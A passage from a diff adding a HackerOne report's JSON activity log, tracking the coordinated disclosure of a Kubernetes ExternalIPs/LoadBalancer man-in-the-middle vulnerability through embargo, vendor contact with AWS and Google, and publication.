QvmYjr4ZK4JQ9RtYItF8kqbeUb19T3r9c1BFd%2Flbj0Y93xziXJ0xw10GDor0lUx1K4OS7yl9A%2Blu8ufd7MEdEy5s%2Fb0XY2gKYgjf3bY8QRGay30L3L42RcYMf3nqFXO7X3T1N8KfU%2FEJ6c%2F0Yh3bz5yjyaOFQ1cpGT8FGzJlBLHOMB8K6GdzC8tTq4pubY1TR8VnEYZnWk469DzZN%2FeC5qF7sUIW6uWIoiJ19UdSfmZ3xCCwnvklPoVeSaksq3JGhl6AKJbJ7cpUX6owVSnjSmLgCyoYJwLnhMsClgfM0126PpfYlelVGHEqacfBJmkI98B9aLbw2Rygpr1c9BZn9lpNURRanA4YamBuyRTY1JryY6807dLLK0V%2BBeikUHYUT9bZWaBeObgiEIzueZxMFdg5O%2F4nPH2PYDDfg%2BCuXmM3SPrsHkedvAu%2Bvt8yI9uTGk3DR4nJJ4TI0FHy0Ibc7OB7Hxz9nuY3peFIeGYbVJO7C3z1Nov6vn8I5jhwgFpB8ZYg6F%2F3%2FMD620wePaHv%2Fp5lGNzOcnQtX5lywxAbgNX2IcOSHijZYISJeuH2n8sh4PLW7PyKQrJUXn3Yw3P24qAY6sQGsyp%2FD97WbhPz5ULuCT2FvDBvfHDbIte5V4gLDv6VQbMsQ%2Fng51ukrSyWVufY5hEkCq9Ao4dGfEh3jBy0Uz7N9VzK9vaAGEEBIO5d0qqm9xxaX0jdUAw9Yapvhd4z7AUfapQhytkyw5%2BB2KUq%2BWaZrN4Ii3L9QfffPDPLtzj0aFCcjy1Gvz4BqiwFMa7vwGaRcwK%2FB4KzhT0sRLNUsk9KS7rpcPkfB2yVzUcgtyiDV64Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=77d480051e0e761bf28dd69f95180e069ae7cd3409e05e3d7b44cc1b1fc632c6"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 8268218,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thank you!",
+      "automated_response": false,
+      "created_at": "2020-06-11T22:36:17.694Z",
+      "updated_at": "2020-06-11T22:36:17.694Z",
+      "actor": {
+        "username": "tallclair",
+        "cleared": false,
+        "verified": false,
+        "url": "/tallclair",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 8461885,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Initial report was more than 6 months ago, any (slow) progress :) ?",
+      "automated_response": false,
+      "created_at": "2020-06-30T22:52:43.428Z",
+      "updated_at": "2020-06-30T22:52:43.428Z",
+      "actor": {
+        "username": "champtar",
+        "cleared": false,
+        "verified": false,
+        "url": "/champtar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 8668110,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @champtar, yes, we're making progress. Unfortunately, it is slow going due to the issues inherent in the design of ExternalIPs. We're working on providing some ways of mitigating the issue for cluster operators. Thanks for your patience.",
+      "automated_response": false,
+      "created_at": "2020-07-21T19:42:18.005Z",
+      "updated_at": "2020-07-21T19:42:18.005Z",
+      "actor": {
+        "username": "jk1joel",
+        "cleared": false,
+        "verified": false,
+        "url": "/jk1joel",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 8668341,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks for the update !",
+      "automated_response": false,
+      "created_at": "2020-07-21T20:14:17.823Z",
+      "updated_at": "2020-07-21T20:14:17.823Z",
+      "actor": {
+        "username": "champtar",
+        "cleared": false,
+        "verified": false,
+        "url": "/champtar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 9558327,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hello K8S Security Team,\n\nSimilarly to GKE, with this bug I can escalate to root on AWS EKS nodes. Do you see any problem if I report it to them ?",
+      "automated_response": false,
+      "created_at": "2020-10-19T02:31:07.391Z",
+      "updated_at": "2020-10-19T02:31:07.391Z",
+      "actor": {
+        "username": "champtar",
+        "cleared": false,
+        "verified": false,
+        "url": "/champtar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 9558332,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Also any news ?",
+      "automated_response": false,
+      "created_at": "2020-10-19T02:33:24.417Z",
+      "updated_at": "2020-10-19T02:33:24.417Z",
+      "actor": {
+        "username": "champtar",
+        "cleared": false,
+        "verified": false,
+        "url": "/champtar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 9570101,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Micah from AWS here, please report it to aws-security@amazon.com (As directed on https://aws.amazon.com/security/vulnerability-reporting/), and if you can mention that you talked to me, it'll get routed correctly a little easier.",
+      "automated_response": false,
+      "created_at": "2020-10-19T23:50:03.952Z",
+      "updated_at": "2020-10-19T23:50:03.952Z",
+      "actor": {
+        "username": "mhausler",
+        "cleared": false,
+        "verified": false,
+        "url": "/mhausler",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/611/880/c3006222ff073932b4376fc2cef2cbaf94a7afdd_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 9570155,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I sent a report around 2h ago without any details about this CVE, just that it exist and allow to MITM the metadata traffic. @mhausler I'll let you share the details if you think it needed. As AWS already has some (broken) security around metadata, fixing it should be enough for both type of MITM",
+      "automated_response": false,
+      "created_at": "2020-10-20T00:09:58.237Z",
+      "updated_at": "2020-10-20T00:09:58.237Z",
+      "actor": {
+        "username": "champtar",
+        "cleared": false,
+        "verified": false,
+        "url": "/champtar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 9687740,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "FYI, the embargo notification for this has been sent to distributors, and the public disclosure date is set for December 7th.",
+      "automated_response": false,
+      "created_at": "2020-10-30T20:22:52.660Z",
+      "updated_at": "2020-10-30T20:22:52.660Z",
+      "actor": {
+        "username": "tallclair",
+        "cleared": false,
+        "verified": false,
+        "url": "/tallclair",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 9705996,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I'm a user and contributor of MetalLB, will the fix to this issue require any changes in LoadBalancer implementation like MetalLB ?",
+      "automated_response": false,
+      "created_at": "2020-11-02T18:47:25.526Z",
+      "updated_at": "2020-11-02T18:47:25.526Z",
+      "actor": {
+        "username": "champtar",
+        "cleared": false,
+        "verified": false,
+        "url": "/champtar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 10011067,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Sorry for not answering your question earlier, but short term we are providing mitigations but not an actual fix to this issue (since it's architectual).\n\nThe embargo is set to be lifted on Monday, December 7th at 9am PT, following our public announcement. You can see the draft announcement here: https://docs.google.com/document/d/1ZOp77rVAVqryKeBZDCLPQQgd0nGanisjfK9Gxq23X-s/edit#",
+      "automated_response": false,
+      "created_at": "2020-12-05T00:52:48.436Z",
+      "updated_at": "2020-12-05T00:52:48.436Z",
+      "actor": {
+        "username": "tallclair",
+        "cleared": false,
+        "verified": false,
+        "url": "/tallclair",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 10026246,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "No problem, I actually got my answers chatting with some folks from AWS.\nI you see this message in time, can you make the attribution \"Etienne Champetier (@champtar) of Anevia\"",
+      "automated_response": false,
+      "created_at": "2020-12-07T14:28:23.968Z",
+      "updated_at": "2020-12-07T14:28:23.968Z",
+      "actor": {
+        "username": "champtar",
+        "cleared": false,
+        "verified": false,
+        "url": "/champtar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 10032992,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Published: https://github.com/kubernetes/kubernetes/issues/97076",
+      "automated_response": false,
+      "created_at": "2020-12-07T22:46:13.826Z",
+      "updated_at": "2020-12-07T22:46:13.826Z",
+      "actor": {
+        "username": "tallclair",
+        "cleared": false,
+        "verified": false,
+        "url": "/tallclair",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "champtar",
+        "url": "/champtar"
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 10032999,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-12-07T22:46:46.697Z",
+      "updated_at": "2020-12-07T22:46:46.697Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "tallclair",
+        "cleared": false,
+        "verified": false,
+        "url": "/tallclair",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 10034181,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Also published: https://blog.champtar.fr/K8S_MITM_LoadBalancer_ExternalIPs/\nRight now https://issuetracker.google.com/issues/158721931 is still in accepted status, so I asked for confirmation if I can speak about the GKE root privilege escalation publicly, as I'm not sure it's fixed",
+      "automated_response": false,
+      "created_at": "2020-12-08T03:13:38.240Z",
+      "updated_at": "2020-12-08T03:13:38.240Z",
+      "actor": {
+        "username": "champtar",
+        "cleared": false,
+        "verified": false,
+        "url": "/champtar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 10122972,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::CancelledDisclosureRequest",
+      "message": "Google is still working on a fixing the root escalation, so canceling the disclosure for now\nAWS silently fixed the issue in https://github.com/aws/aws-ec2-instance-connect-config/commit/c15b99fa223f277787e50b044baf39e483dedf8c",
+      "automated_response": false,
+      "created_at": "2020-12-16T15:49:58.636Z",
+      "updated_at": "2020-12-16T15:49:58.636Z",
+      "actor": {
+        "username": "champtar",
+        "cleared": false,
+        "verified": false,
+        "url": "/champtar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 13804859,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-10-08T03:49:21.014Z",
+      "updated_at": "2021-10-08T03:49:21.014Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "champtar",
+        "cleared": false,
+        "verified": false,
+        "url": "/champtar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 14182396,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-11-04T18:09:23.075Z",
+      "updated_at": "2021-11-04T18:09:23.075Z",
+      "actor": {
+        "username": "cjcullen",
+        "cleared": false,
+        "verified": false,
+        "url": "/cjcullen",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 14182397,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-11-04T18:09:23.252Z",
+      "updated_at": "2021-11-04T18:09:23.252Z",
+      "actor": {
+        "username": "cjcullen",
+        "cleared": false,
+        "verified": false,
+        "url": "/cjcullen",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 96744,
+      "category": "researcher",
+      "content": "Write up available at https://blog.champtar.fr/K8S_MITM_LoadBalancer_ExternalIPs/",
+      "user": {
+        "id": 700624,
+        "username": "champtar",
+        "name": "Etienne Champetier",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2019-08-07T07:30:17.243Z",
+        "url": "https://hackerone.com/champtar",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [
+
+      ]
+    }
+  ]
+}
